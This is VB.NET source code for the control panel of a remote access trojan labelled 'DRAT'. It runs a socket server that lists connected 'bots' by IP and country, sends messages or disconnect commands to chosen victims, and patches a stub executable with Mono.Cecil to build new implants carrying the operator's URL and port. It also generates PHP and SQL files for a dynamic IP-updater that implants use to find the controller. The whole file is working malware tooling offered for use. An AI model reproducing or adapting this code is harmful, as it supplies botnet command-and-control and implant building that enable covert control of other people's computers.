Imports System.IO
Imports System.Threading
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports MySql.Data.MySqlClient

Public Class Form1

    Dim ip As Boolean = False
    Dim h As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)
    Public WithEvents S As SocketServer
    Public SPL As String = "[DRAT]"
    Public sock As Integer

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False
        TabControl1.SelectTab(1)
        IP_Checker.WorkerReportsProgress = True
        IP_Checker.WorkerSupportsCancellation = True
        LIP.Text = "Loading ..." : LIP.ForeColor = Color.Blue : LIP.Refresh()
        EIP.Text = "Loading ..." : EIP.ForeColor = Color.Blue : EIP.Refresh()
        If IP_Checker.IsBusy = False Then
            IP_Checker.RunWorkerAsync()
        Else
            IP_Checker.CancelAsync()
        End If
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        infot.Text = "INFO : Port [ yyy ] ~ Online [ xxx ] ~ Selected [ zzz ]".Replace("yyy", NumericUpDown1.Value.ToString).Replace("xxx", BOTLIST.Items.Count).Replace("zzz", BOTLIST.SelectedItems.Count)
    End Sub

    Private Sub STBTN_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles STBTN.Click
        Try
            S = New SocketServer
            S.Start(NumericUpDown1.Value)
        Catch : End Try
        STBTN.Enabled = 0
        STOBTN.Enabled = 1
        infot.ForeColor = Color.Green
        Timer1.Start()
    End Sub

    Private Sub STOBTN_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles STOBTN.Click
        For Each x As ListViewItem In BOTLIST.Items
            S.Disconnect(x.ToolTipText)
        Next
        S.stops()
        STOBTN.Enabled = 0
        STBTN.Enabled = 1
        Timer1.Stop()
        infot.ForeColor = Color.Black
    End Sub

    Sub Connected(ByVal sock As Integer) Handles S.Connected
        S.Send(sock, "GET_INFO")
    End Sub

    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        Try
            BOTLIST.Items(sock.ToString).Remove()
        Catch ex As Exception
        End Try
    End Sub

    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim T As String = BS(B)
        Dim A As String() = Split(T, SPL)
        Try
            If A(0) = "SENT_INFO" Then
                Dim L = BOTLIST.Items.Add(sock.ToString, A(1), GetCountryNumber(UCase(A(4))))
                L.SubItems.Add(S.IP(sock))
                L.SubItems.Add(A(2))
                L.SubItems.Add(A(3))
                L.SubItems.Add(A(4))
                L.ToolTipText = sock
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub SendMessageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendMessageToolStripMenuItem.Click
        Dim MSG As String = InputBox("Enter Your Message", "Coded By ʍᴙ.ώoŁƒ")
        If MSG = "" Then
            Exit Sub
        Else
            For Each x As ListViewItem In BOTLIST.SelectedItems
                S.Send(x.ToolTipText, "SENT_SMS" & SPL & MSG)
            Next
        End If
    End Sub

    Private Sub DisconnectToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisconnectToolStripMenuItem.Click
        For Each x As ListViewItem In BOTLIST.SelectedItems
            S.Send(x.ToolTipText, "SENT_DIS")
        Next
    End Sub

    Private Sub BUILDBTN_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BUILDBTN.Click
        Dim asm As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\D-STUB.exe")
        Dim tdf As TypeDefinition
        For Each tdf In asm.MainModule.GetTypes
            Dim mdf As MethodDefinition
            For Each mdf In tdf.Methods
                If (mdf.Name = ".cctor") Then
                    Dim enm As IEnumerator(Of Instruction) = Nothing
                    Try
                        enm = mdf.Body.Instructions.GetEnumerator
                        Do While enm.MoveNext
                            Dim current As Instruction = enm.Current
                            If (current.OpCode.Code = Code.Ldstr) Then
                                Dim strings As String = current.Operand.ToString
                                If (strings = "[1]") Then current.Operand = URLTB.Text
                                If (strings = "[2]") Then current.Operand = NumericUpDown1.Value.ToString
                                If (strings = "[3]") Then current.Operand = VNTB.Text
                                If (strings = "[4]") Then current.Operand = EXETB.Text
                            End If
                        Loop
                    Finally
                        enm.Dispose()
                    End Try
                End If
            Next
        Next

        Dim sfd As New SaveFileDialog
        With sfd
            .Filter = "Assembly|*.exe"
            .FileName = EXETB.Text
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                asm.Write(.FileName)
                MsgBox("Done !", vbInformation)
            End If
        End With
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Label9.Visible = True
        Dim MysqlConn As New MySqlConnection()
        MysqlConn.ConnectionString = "server=" & HT.Text & ";" & "user id=" & UT.Text & ";" _
        & "password=" & PT.Text & ";" & "database=" & DBT.Text
        Try
            MysqlConn.Open()
            Label9.Text = "Done ! Connected To DB"
            Label9.ForeColor = Color.Green : Label9.Refresh() : Me.Refresh()
            Using comm As New MySqlCommand()
                With comm
                    .Connection = MysqlConn
                    .CommandText = "UPDATE `IP_updater` SET `New_IP`='xxx' WHERE 1".Replace("xxx", EIP.Text)
                    .CommandType = CommandType.Text
                End With
                Try
                    comm.ExecuteNonQuery()
                Catch ex As MySqlException
                    MsgBox(ex.Message.ToString())
                End Try
            End Using
            Label9.Text = "New IP Successfully saved! [ IP : " & EIP.Text & " ]"
        Catch myerror As MySqlException
            Label9.Text = "Error ! Cannot Connect To DB"
            Label9.ForeColor = Color.Red : Label9.Refresh()
        End Try
        MysqlConn.Dispose()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim PHP As String = My.Resources.PHP_Page
        PHP = PHP.Replace("|H|", HT.Text)
        PHP = PHP.Replace("|U|", UT.Text)
        PHP = PHP.Replace("|P|", PT.Text)
        PHP = PHP.Replace("|DB|", DBT.Text)
        Dim SFD As New SaveFileDialog
        SFD.Filter = "PHP Page|*.php"
        With SFD
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                IO.File.WriteAllText(.FileName, PHP)
            Else
                Exit Sub
            End If
        End With
        MsgBox("PHP Page Generated !", MsgBoxStyle.Information, "PHP")
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim SFD As New SaveFileDialog
        SFD.Filter = "Code SQL|*.SQL"
        With SFD
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                IO.File.WriteAllText(.FileName, My.Resources.DB)
            Else
                Exit Sub
            End If
        End With
        MsgBox("Code SQL Generated !", MsgBoxStyle.Information, "SQL")
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Dim Web As New WebBrowser
        Web.Navigate(URLTB.Text)
        Do While Web.ReadyState <> WebBrowserReadyState.Complete
            Application.DoEvents()
        Loop
        MsgBox(Web.Url.Host)
    End Sub

    Private Sub IP_Checker_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles IP_Checker.DoWork
        If InternetConnection() Then
            LIP.Text = "1.3.3.7" 'h.AddressList.GetValue(0).ToString
            LIP.ForeColor = Color.Green
            EIP.Text = "1.3.3.7" 'GetExternalIp()
            EIP.ForeColor = Color.Green
            ip = True
        Else
            LIP.Text = "Error [Internet Connection]"
            LIP.ForeColor = Color.Red
            EIP.Text = "Error [Internet Connection]"
            EIP.ForeColor = Color.Red
        End If
    End Sub
End Class
